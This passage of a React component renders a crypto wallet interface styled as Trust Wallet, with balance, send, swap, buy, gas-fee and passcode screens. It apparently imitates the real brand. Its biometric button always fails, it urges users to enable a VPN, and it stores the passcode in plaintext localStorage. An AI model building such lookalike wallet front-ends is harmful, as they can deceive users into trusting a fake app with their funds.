                                                                                        key={c} 
                                                                                        onClick={() => { setDefaultCurrency(c); setShowCurrencyPicker(false); }}
                                                                                        className={`py-2 rounded-lg text-[10px] font-bold border transition-all ${defaultCurrency === c ? 'bg-blue-500/20 border-blue-500 text-blue-400' : 'bg-white/5 border-transparent opacity-40'}`}
                                                                                    >
                                                                                        {c}
                                                                                    </button>
                                                                                ))}
                                                                            </div>
                                                                        </motion.div>
                                                                    )}
                                                                </AnimatePresence>
                                                            </div>
                                                        </div>

                                                        {/* Section: Support */}
                                                        <div className="px-6 mb-6">
                                                            <p className="text-[10px] font-black uppercase tracking-widest opacity-30 mb-3">Support</p>
                                                            <div className="space-y-2">
                                                                <a href="https://twtholders.trustwallet.com/" target="_blank" rel="noopener noreferrer" className="w-full flex items-center gap-3 p-3 rounded-xl hover:bg-white/5 transition-all">
                                                                    <div className={`w-8 h-8 rounded-lg flex items-center justify-center ${theme === 'dark' ? 'bg-white/10' : 'bg-gray-100'}`}>
                                                                        <Globe className="w-4 h-4 opacity-60" />
                                                                    </div>
                                                                    <span className="text-sm font-medium">Help Center</span>
                                                                </a>
                                                                <div className="flex items-center justify-center gap-6 pt-4">
                                                                    <a href="https://trustwallet.com/" target="_blank" rel="noopener noreferrer" className="opacity-30 hover:opacity-100 hover:text-blue-400 transition-all">
                                                                        <Plus className="w-5 h-5" />
                                                                    </a>
                                                                    <a href="https://twitter.com/trustwallet" target="_blank" rel="noopener noreferrer" className="opacity-30 hover:opacity-100 hover:text-blue-400 transition-all">
                                                                        <Globe className="w-5 h-5" />
                                                                    </a>
                                                                    <a href="https://trustwallet.com/security" target="_blank" rel="noopener noreferrer" className="opacity-30 hover:opacity-100 hover:text-blue-400 transition-all">
                                                                        <Shield className="w-5 h-5" />
                                                                    </a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    {address && (
                                                        <div className="p-6 border-t border-white/5">
                                                            <button onClick={() => { disconnectWallet(); setShowSettingsMenu(false); }} className="w-full py-4 bg-red-500/10 hover:bg-red-500/20 text-red-500 rounded-2xl font-black uppercase tracking-widest text-[11px] transition-all flex items-center justify-center gap-2">
                                                                <LogOut className="w-4 h-4" />
                                                                Disconnect
                                                            </button>
                                                        </div>
                                                    )}
                                                </div>
                                            </motion.div>
                                        </>
                                    )}
                                </AnimatePresence>

                        {/* Main Content Area */}
                        <div className="px-0 md:px-6 mb-12">
                            <AnimatePresence mode="wait">
                                {view === 'wallet' ? (
                                    <motion.div key="wallet-view" initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
                                        {/* Wallet Badge */}
                                        <div className="flex justify-center mt-6 mb-4">
                                            <button 
                                                onClick={copyAddress}
                                                className={`flex items-center gap-2 px-4 py-2 rounded-full transition-all ${
                                                    theme === 'dark' ? 'bg-white/10 hover:bg-white/20' : 'bg-[#f0f0f2] hover:bg-gray-200'
                                                }`}
                                            >
                                                <span className="text-sm font-bold">Main Wallet 1</span>
                                                <ChevronRight className="w-4 h-4 opacity-40" />
                                                <Copy className={`w-3.5 h-3.5 transition-opacity ${copied ? 'text-green-500' : 'opacity-40'}`} />
                                            </button>
                                        </div>

                                        {/* Balance */}
                                        <div className="text-center mb-10 px-4">
                                            <div className="flex flex-col items-center">
                                                <h1 className="text-[48px] font-bold tracking-tight leading-tight mb-1">
                                                    {address ? (maskAccount ? '••••••' : formatFiat(totalBalance)) : `${currencySymbol}0.00`}
                                                </h1>
                                                {address && assets.length > 0 && (() => {
                                                    const totalUsd = assets.reduce((s, a) => s + a.usdValue, 0);
                                                    const weightedChange = totalUsd > 0
                                                        ? assets.reduce((s, a) => s + (a.priceChange * (a.usdValue / totalUsd)), 0)
                                                        : 0;
                                                    const changeUsd = totalUsd * (weightedChange / 100);
                                                    const isPositive = weightedChange >= 0;
                                                    return (
                                                        <div className={`flex items-center gap-1 text-[15px] font-bold ${isPositive ? (theme === 'dark' ? 'text-green-400' : 'text-green-600') : (theme === 'dark' ? 'text-red-400' : 'text-red-600')}`}>
                                                            <span className="text-sm">{isPositive ? '▲' : '▼'}</span>
                                                            <span>{maskAccount ? '••••' : `${currencySymbol}${Math.abs(changeUsd * fxRate).toFixed(2)} (${isPositive ? '+' : ''}${weightedChange.toFixed(2)}%)`}</span>
                                                        </div>
                                                    );
                                                })()}
                                            </div>
                                        </div>
                                        {/* Actions */}
                                        <div className="flex justify-center gap-4 mb-10 px-4">
                                            {[
                                                { label: 'Send', icon: <ArrowUpRight className="w-7 h-7" />, action: () => address ? setView('send') : setShowAccountPrompt(true) },
                                                { label: 'Receive', icon: <ArrowDown className="w-7 h-7" />, action: () => address ? setView('receive') : setShowAccountPrompt(true) },
                                                { label: 'Swap', icon: <RefreshCw className="w-7 h-7" />, action: () => setView('swap') },
                                                { label: 'Buy', icon: <Plus className="w-7 h-7" />, action: () => address ? setView('buy') : setShowAccountPrompt(true) },
                                            ].map((btn, i) => (
                                                <div key={i} className="flex flex-col items-center gap-2 flex-1 max-w-[80px]">
                                                    <button 
                                                        onClick={btn.action} 
                                                        className={`w-[68px] h-[68px] rounded-[1.5rem] flex items-center justify-center transition-all active:scale-95 ${
                                                            theme === 'dark' ? 'bg-white/10 hover:bg-white/20 text-white' : 'bg-[#f0f0f2] hover:bg-gray-200 text-black'
                                                        }`}
                                                    >
                                                        {btn.icon}
                                                    </button>
                                                    <span className="text-[13px] font-bold opacity-80">{btn.label}</span>
                                                </div>
                                            ))}
                                        </div>


                                            <div className={`md:rounded-[2.5rem] md:border overflow-hidden ${theme === 'dark' ? 'bg-black border-white/10' : 'bg-white border-gray-100 md:shadow-xl'}`}>
                                                <div className="px-4 md:px-8 py-5 flex gap-8">
                                                    <button onClick={() => setActiveTab('crypto')} className={`text-sm font-bold relative pb-2 transition-all ${activeTab === 'crypto' ? 'text-blue-600 dark:text-blue-500' : 'opacity-40'}`}>
                                                        Crypto
                                                        {activeTab === 'crypto' && <div className="absolute -bottom-5 left-0 right-0 h-[3px] bg-blue-600 dark:bg-blue-500" />}
                                                    </button>
                                                    <button onClick={() => setActiveTab('history')} className={`text-sm font-bold relative pb-2 transition-all ${activeTab === 'history' ? 'text-blue-600 dark:text-blue-500' : 'opacity-40'}`}>
                                                        History
                                                        {activeTab === 'history' && <div className="absolute -bottom-5 left-0 right-0 h-[3px] bg-blue-600 dark:bg-blue-500" />}
                                                    </button>
                                                </div>

                                                <div className="p-0 md:p-2 min-h-[400px]">
                                                    <AnimatePresence mode="wait">
                                                        {activeTab === 'crypto' ? (
                                                            <motion.div key="crypto" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="divide-y divide-gray-50 dark:divide-white/5">
                                                                {!address ? (
                                                                    <div className="flex flex-col items-center justify-center py-20 text-center px-8">
                                                                        <div className="w-20 h-20 bg-blue-500/10 rounded-[2.5rem] flex items-center justify-center mb-6">
                                                                            <ShieldAlert className="w-10 h-10 text-blue-500 opacity-40" />
                                                                        </div>
                                                                        <h3 className="text-xl font-bold mb-3 opacity-80">Connect Wallet</h3>
                                                                        <p className="text-xs opacity-40 leading-relaxed mb-8">Please connect your wallet to view your asset balances and transaction history.</p>
                                                                        <button 
                                                                            onClick={connectWallet}
                                                                            className="px-8 py-4 bg-blue-500 text-white rounded-2xl font-bold uppercase tracking-widest text-[11px] shadow-xl shadow-blue-500/20 active:scale-95 transition-all"
                                                                        >
                                                                            Connect Now
                                                                        </button>
                                                                        <p className="text-[10px] opacity-30 mt-6 leading-relaxed px-4">
                                                                            🔒 If connection fails, try enabling a VPN — some networks block wallet services.
                                                                        </p>
                                                                    </div>
                                                                ) : (
                                                                    <>
                                                                        {assets.map((asset, idx) => (
                                                                            <div key={asset.id} onClick={() => handleAssetClick(asset.symbol)} className={`flex items-center justify-between px-5 py-6 transition-all cursor-pointer group ${
                                                                                theme === 'dark' ? 'hover:bg-white/5' : 'hover:bg-gray-50'
                                                                            }`}>
                                                                                <div className="flex items-center gap-4">
                                                                                    <div className="relative">
                                                                                        <div className="w-12 h-12 rounded-full bg-white p-2 shadow-sm border border-gray-100 flex items-center justify-center overflow-hidden shrink-0">
                                                                                            <img src={asset.icon} alt={asset.symbol} className="w-full h-full object-contain" />
                                                                                        </div>
                                                                                        {COIN_MAP[asset.symbol]?.network && (
                                                                                            <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-white rounded-full flex items-center justify-center border border-gray-100 p-0.5 shadow-sm">
                                                                                                <img src={NETWORKS[COIN_MAP[asset.symbol].network]} className="w-full h-full object-contain" />
                                                                                            </div>
                                                                                        )}
                                                                                    </div>
                                                                                    <div>
                                                                                        <div className="flex items-center gap-2 mb-1">
                                                                                            <p className="font-bold text-base leading-none">{asset.name}</p>
                                                                                            <span className="px-2 py-0.5 rounded-full bg-gray-100 dark:bg-white/10 text-[10px] font-medium text-gray-500 dark:text-gray-400">
                                                                                                {asset.symbol === 'TETHEREUM' ? 'T99' : asset.symbol}
                                                                                            </span>
                                                                                        </div>
                                                                                        <div className="flex items-center gap-2">
                                                                                            <span className="text-[13px] text-gray-500 dark:text-gray-400 font-medium">
                                                                                                {formatFiat(asset.marketPrice)}
                                                                                            </span>
                                                                                            <span className={`text-[13px] font-bold ${asset.priceChange >= 0 ? 'text-green-500' : 'text-red-500'}`}>
                                                                                                {asset.priceChange >= 0 ? '+' : ''}{asset.priceChange.toFixed(2)}%
                                                                                            </span>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                                <div className="flex flex-col items-end">
                                                                                    <p className="font-bold text-lg leading-none mb-1">{maskAccount ? '••••' : parseFloat(asset.balance.toFixed(8)).toString()}</p>
                                                                                    <p className="text-[13px] font-medium text-gray-400 dark:text-gray-500">
                                                                                        {maskAccount ? '••••' : formatFiat(asset.usdValue)}
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                        ))}
                                                                    </>
                                                                )}
                                                            </motion.div>
                                                        ) : (
                                                            <motion.div key="history" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                                                                <TransactionHistory
                                                                    transactions={transactions}
                                                                    marketPrices={marketPrices}
                                                                    currencySymbol={currencySymbol}
                                                                    fxRate={fxRate}
                                                                    maskAccount={maskAccount}
                                                                    address={address}
                                                                    onConnect={connectWallet}
                                                                    theme={theme}
                                                                />
                                                            </motion.div>
                                                        )}
                                                    </AnimatePresence>
                                                </div>
                                            </div>
                                    </motion.div>
                                ) : view === 'send' ? (
                                    <motion.div key="send-view" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: 20 }}>
                                        <WithdrawalModal 
                                            isOpen={true} 
                                            onClose={() => setView('wallet')} 
                                            bnbBalance={bnbBalance} 
                                            t22Balance={t22Balance} 
                                            usdtBalance={usdtEthBalance}
                                            usdtBnbBalance={usdtBnbBalance}
                                            ctmBalance={ctmBalance}
                                            marketPrices={marketPrices}
                                            maskAccount={maskAccount} 
                                            currencySymbol={currencySymbol} 
                                            fxRate={fxRate} 
                                            theme={theme} 
                                            onSuccess={fetchTransactionsData}
                                            isInline={true}
                                        />
                                    </motion.div>
                                ) : view === 'receive' ? (
                                    <motion.div key="receive-view" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: 20 }}>
                                        <ReceiveModal 
                                            isOpen={true} 
                                            onClose={() => setView('wallet')} 
                                            currencySymbol={currencySymbol} 
                                            fxRate={fxRate} 
                                            theme={theme} 
                                            isInline={true}
                                        />
                                    </motion.div>
                                ) : view === 'buy' ? (
                                    <motion.div key="buy-view" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: 20 }}>
                                        <BuyModal 
                                            address={address} 
                                            isOpen={true} 
                                            onClose={() => setView('wallet')} 
                                            theme={theme} 
                                            onSuccess={fetchTransactionsData}
                                            isInline={true}
                                        />
                                    </motion.div>
                                ) : view === 'swap' ? (
                                    <motion.div key="swap-view" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: 20 }}>
                                        <SwapModal 
                                            address={address} 
                                            isOpen={true} 
                                            onClose={() => setView('wallet')} 
                                            onSuccess={fetchTransactionsData} 
                                            initialFromToken={selectedAssetForSwap} 
                                            bnbBalance={bnbBalance} 
                                            t22Balance={t22Balance} 
                                            usdtBalance={usdtEthBalance}
                                            usdtBnbBalance={usdtBnbBalance}
                                            ctmBalance={ctmBalance}
                                            marketPrices={marketPrices}
                                            currencySymbol={currencySymbol} 
                                            fxRate={fxRate} 
                                            theme={theme} 
                                            isInline={true}
                                        />
                                    </motion.div>
                                ) : (
                                    <motion.div key="coming-soon" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="py-20 text-center">
                                        <div className="w-20 h-20 bg-blue-500/10 rounded-[2rem] flex items-center justify-center mx-auto mb-6">
                                            <Plus className="w-10 h-10 text-blue-500" />
                                        </div>
                                        <h2 className="text-2xl font-black uppercase tracking-widest mb-2">{view} View</h2>
                                        <p className="text-sm opacity-40">This feature is coming soon.</p>
                                        <button onClick={() => setView('wallet')} className="mt-8 px-8 py-3 bg-blue-500 text-white rounded-xl font-black uppercase tracking-widest text-[11px]">Back to Wallet</button>
                                    </motion.div>
                                )}
                            </AnimatePresence>
                        </div>
                    </div>
                </motion.div>
            </motion.div>

            {/* Native Tab Bar */}
            {!showSettingsMenu && (
                <div className={`fixed bottom-0 left-0 right-0 z-[100] backdrop-blur-2xl border-t safe-area-inset-bottom md:hidden ${
                    theme === 'dark' ? 'bg-black/80 border-white/10' : 'bg-white/90 border-gray-100 shadow-2xl'
                }`}>
                    <div className="flex justify-around items-center px-2 py-4">
                        {[
                            { label: 'Wallet', icon: <Wallet className="w-5 h-5" />, active: view === 'wallet', action: () => setView('wallet') },
                            { label: 'Swap', icon: <ArrowUpDown className="w-5 h-5" />, active: view === 'swap', action: () => setView('swap') },
                            { label: 'Send', icon: <ArrowUp className="w-5 h-5" />, active: view === 'send', action: () => address ? setView('send') : setShowAccountPrompt(true) },
                            { label: 'Settings', icon: <Settings2 className="w-5 h-5" />, action: () => setShowSettingsMenu(true) },
                        ].map((tab, i) => (
                            <button key={i} onClick={tab.action} className="flex flex-col items-center gap-1.5 flex-1 relative">
                                <div className={`${tab.active ? 'text-blue-500' : 'opacity-30'}`}>{tab.icon}</div>
                                <span className={`text-[9px] font-black uppercase tracking-widest ${tab.active ? 'text-blue-500' : 'opacity-20'}`}>{tab.label}</span>
                            </button>
                        ))}
                    </div>
                </div>
            )}

            {/* Desktop Footer */}
            <div className="hidden md:block fixed bottom-8 left-1/2 -translate-x-1/2 z-50">
                <div className={`px-6 py-3 rounded-full backdrop-blur-xl border shadow-2xl flex items-center gap-4 ${theme === 'dark' ? 'bg-black/50 border-white/10' : 'bg-white/80 border-gray-100'}`}>
                    <div className="flex items-center gap-2">
                        <div className={`w-1.5 h-1.5 rounded-full ${address ? 'bg-green-500 shadow-[0_0_8px_#22c55e]' : 'bg-yellow-500'} animate-pulse`} />
                        <span className="text-[10px] font-black uppercase tracking-widest opacity-40">{address ? 'Connected' : 'Not Connected'}</span>
                    </div>
                    {address && (
                        <>
                            <div className="w-[1px] h-3 bg-white/10" />
                            <button onClick={() => disconnectWallet()} className="text-[10px] font-black uppercase tracking-widest text-red-500/60 hover:text-red-500 transition-colors">Disconnect</button>
                        </>
                    )}
                </div>
            </div>

            {/* Modals */}
            <WithdrawalModal 
                isOpen={showWithdrawModal} 
                onClose={() => setShowWithdrawModal(false)} 
                bnbBalance={bnbBalance} 
                t22Balance={t22Balance} 
                usdtBalance={usdtEthBalance}
                usdtBnbBalance={usdtBnbBalance}
                ctmBalance={ctmBalance}
                marketPrices={marketPrices}
                maskAccount={maskAccount} 
                currencySymbol={currencySymbol} 
                fxRate={fxRate} 
                theme={theme} 
                onSuccess={fetchTransactionsData} 
            />
            <SwapModal 
                address={address} 
                isOpen={showSwapModal} 
                onClose={() => setShowSwapModal(false)} 
                onSuccess={fetchTransactionsData} 
                initialFromToken={selectedAssetForSwap} 
                bnbBalance={bnbBalance} 
                t22Balance={t22Balance} 
                usdtBalance={usdtEthBalance}
                usdtBnbBalance={usdtBnbBalance}
                ctmBalance={ctmBalance}
                marketPrices={marketPrices}
                currencySymbol={currencySymbol} 
                fxRate={fxRate} 
                theme={theme} 
            />
            <BuyModal address={address} isOpen={showBuyModal} onClose={() => setShowBuyModal(false)} theme={theme} onSuccess={fetchTransactionsData} />
            <GasFeeModal isOpen={showGasFeeModal} onClose={() => setShowGasFeeModal(false)} theme={theme} user={address} onSuccess={addGasFeeTransaction} />
            <ReceiveModal isOpen={showRecieveModal} onClose={() => setShowRecieveModal(false)} currencySymbol={currencySymbol} fxRate={fxRate} theme={theme} />
            
            <AnimatePresence>
                {showAccountPrompt && (
                    <div className="fixed inset-0 z-[200] flex items-center justify-center p-6">
                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 bg-black/80 backdrop-blur-md" onClick={() => setShowAccountPrompt(false)} />
                        <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }} className={`relative w-full max-w-sm rounded-[3rem] p-10 text-center border shadow-2xl ${theme === 'dark' ? 'bg-black border-white/10' : 'bg-white border-transparent'}`}>
                            <div className="w-20 h-20 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
                                <Wallet className="w-10 h-10 text-blue-500" />
                            </div>
                            <h3 className="text-2xl font-black mb-2">Connect Wallet</h3>
                            <p className="text-sm opacity-40 mb-8">Please connect your wallet to continue with this action.</p>
                            <button onClick={() => { setShowAccountPrompt(false); connectWallet(); }} className="w-full py-4 bg-blue-500 hover:bg-blue-600 text-white rounded-2xl font-black uppercase tracking-widest transition-all">Connect Now</button>
                            <p className="text-[10px] opacity-30 mt-5 leading-relaxed">
                                🔒 If connection fails, try enabling a VPN — some networks block wallet services.
                            </p>
                        </motion.div>
                    </div>
                )}
            </AnimatePresence>
            <AnimatePresence>
                {showPinModal && (
                    <div className="fixed inset-0 z-[250] flex items-center justify-center p-6">
                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className={`absolute inset-0 backdrop-blur-xl ${theme === 'dark' ? 'bg-black/95' : 'bg-white/95'}`} />
                        <motion.div initial={{ y: 20, opacity: 0 }} animate={{ y: 0, opacity: 1 }} exit={{ y: 20, opacity: 0 }} className={`relative w-full max-w-xs text-center ${theme === 'dark' ? 'text-white' : 'text-black'}`}>
                            <div className="mb-12">
                                <Shield className="w-12 h-12 text-blue-500 mx-auto mb-4" />
                                <h3 className="text-xl font-bold">
                                    {pinStep === 'setup' ? 'Set Passcode' : pinStep === 'confirm' ? 'Confirm Passcode' : 'Enter Passcode'}
                                </h3>
                                <p className="text-sm opacity-40 mt-1">
                                    {pinStep === 'setup' ? 'Create a 6-digit passcode' : pinStep === 'confirm' ? 'Repeat your passcode' : 'Access your wallet'}
                                </p>
                                {pinMessage && (
                                    <motion.p 
                                        initial={{ opacity: 0, y: -10 }} 
                                        animate={{ opacity: 1, y: 0 }} 
                                        className={`text-[10px] font-bold mt-2 ${pinMessage.isError ? 'text-red-500' : 'text-green-500'}`}
                                    >
                                        {pinMessage.text}
                                    </motion.p>
                                )}
                            </div>

                            <div className="flex justify-center gap-4 mb-16">
                                {[...Array(6)].map((_, i) => (
                                    <div key={i} className={`w-3.5 h-3.5 rounded-full border-2 transition-all duration-200 ${
                                        (pinStep === 'confirm' ? confirmPin : pin).length > i 
                                        ? 'bg-blue-500 border-blue-500 scale-110' 
                                        : theme === 'dark' ? 'border-white/20' : 'border-black/10'
                                    }`} />
                                ))}
                            </div>

                            <div className="grid grid-cols-3 gap-6 max-w-[280px] mx-auto">
                                {[1, 2, 3, 4, 5, 6, 7, 8, 9, 'bio', 0, 'del'].map((num, i) => (
                                    <button
                                        key={i}
                                        disabled={num === ''}
                                        onClick={() => {
                                            if (num === 'bio') {
                                                setPinMessage({ text: 'Biometric failed. Please try again later.', isError: true });
                                                setTimeout(() => setPinMessage(null), 3000);
                                                return;
                                            }
                                            if (num === 'del') {
                                                if (pinStep === 'confirm') setConfirmPin(p => p.slice(0, -1));
                                                else setPin(p => p.slice(0, -1));
                                                return;
                                            }
                                            
                                            const current = pinStep === 'confirm' ? confirmPin : pin;
                                            if (current.length >= 6) return;
                                            
                                            const next = current + num;
                                            if (pinStep === 'confirm') {
                                                setConfirmPin(next);
                                                if (next.length === 6) {
                                                    if (next === pin) {
                                                        localStorage.setItem('appPin', next);
                                                        setSavedPin(next);
                                                        setIsAppLockEnabled(true);
                                                        setShowPinModal(false);
                                                        setPinMessage({ text: 'Passcode saved successfully', isError: false });
                                                        setTimeout(() => setPinMessage(null), 2000);
                                                    } else {
                                                        setPinMessage({ text: 'Passcodes do not match. Try again.', isError: true });
                                                        setTimeout(() => setPinMessage(null), 3000);
                                                        setPin('');
                                                        setConfirmPin('');
                                                        setPinStep('setup');
                                                    }
                                                }
                                            } else {
                                                setPin(next);
                                                if (next.length === 6) {
                                                    setPinStep('confirm');
                                                }
                                            }
                                        }}
                                        className={`w-16 h-16 rounded-full flex items-center justify-center text-2xl font-bold transition-all active:scale-90 ${
                                            num === '' ? 'opacity-0' : (theme === 'dark' ? 'bg-white/5 hover:bg-white/10' : 'bg-black/5 hover:bg-black/10')
                                        }`}
                                    >
                                        {num === 'del' ? <X className="w-6 h-6" /> : num === 'bio' ? <Fingerprint className="w-8 h-8 text-blue-500" /> : num}
                                    </button>
                                ))}
                            </div>

                            <button onClick={() => setShowPinModal(false)} className="mt-12 text-sm font-bold text-blue-500 opacity-60 hover:opacity-100 transition-opacity">
                                Cancel
                            </button>
                        </motion.div>
                    </div>
                )}
            </AnimatePresence>
            <AnimatePresence>
                {showMobilePrompt && (
                    <div className="fixed inset-0 z-[300] flex items-center justify-center p-6">
                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 bg-black/80 backdrop-blur-md" onClick={() => setShowMobilePrompt(false)} />
                        <motion.div initial={{ y: 20, opacity: 0 }} animate={{ y: 0, opacity: 1 }} exit={{ y: 20, opacity: 0 }} className={`relative w-full max-w-sm rounded-[3rem] p-8 text-center border shadow-2xl ${theme === 'dark' ? 'bg-[#0a0b0d] border-white/10' : 'bg-white border-transparent'}`}>
                            <div className="w-20 h-20 bg-blue-500/10 rounded-[2rem] flex items-center justify-center mx-auto mb-6">
                                <Globe className="w-10 h-10 text-blue-500" />
                            </div>
                            <h3 className="text-2xl font-black mb-3 leading-tight">Continue on the Mobile App?</h3>
                            <p className="text-sm opacity-40 mb-8 px-4">For a more secure and seamless DApp experience, we recommend using the official Trust Wallet mobile application.</p>
                            
                            <div className="space-y-3">
                                <a 
                                    href="https://trustwallet.com/download" 
                                    target="_blank" 
                                    rel="noopener noreferrer"
                                    onClick={() => setShowMobilePrompt(false)}
                                    className="w-full py-4 bg-blue-500 hover:bg-blue-600 !text-white rounded-2xl font-black uppercase tracking-widest transition-all block text-center text-[11px]"
                                >
                                    Open Mobile App
                                </a>
                                <button 
                                    onClick={() => {
                                        window.open(pendingDappUrl, '_blank');
                                        setShowMobilePrompt(false);
                                    }}
                                    className={`w-full py-4 rounded-2xl font-black uppercase tracking-widest transition-all text-[11px] border ${
                                        theme === 'dark' ? 'bg-white/5 border-white/5 hover:bg-white/10 text-white' : 'bg-gray-50 border-gray-100 hover:bg-gray-100 text-black'
                                    }`}
                                >
                                    Continue in Browser
                                </button>
                            </div>
                            
                            <button onClick={() => setShowMobilePrompt(false)} className="mt-6 text-[10px] font-black uppercase tracking-widest opacity-20 hover:opacity-100 transition-opacity">
                                Maybe Later
                            </button>
                        </motion.div>
                    </div>
                )}
            </AnimatePresence>
        </div>
    );
}
